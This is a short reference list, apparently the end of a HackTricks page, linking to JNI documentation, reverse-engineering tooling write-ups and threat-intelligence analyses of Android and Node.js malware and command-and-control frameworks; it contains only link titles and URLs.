- JNI_OnLoad and invocation API – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/invocation.html#JNJI_OnLoad)
- RegisterNatives – [docs.oracle.com](https://docs.oracle.com/javase/8/docs/technotes/guides/jni/spec/functions.html#RegisterNatives)
- Tracing JNI Functions – [valsamaras.medium.com](https://valsamaras.medium.com/tracing-jni-functions-75b04bee7c58)
- Native Enrich: Scripting Ghidra and Frida to discover hidden JNI functions – [laripping.com](https://laripping.com/blog-posts/2021/12/20/nativeenrich.html)
- [Unit42 – AdaptixC2: A New Open-Source Framework Leveraged in Real-World Attacks](https://unit42.paloaltonetworks.com/adaptixc2-post-exploitation-framework/)
- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
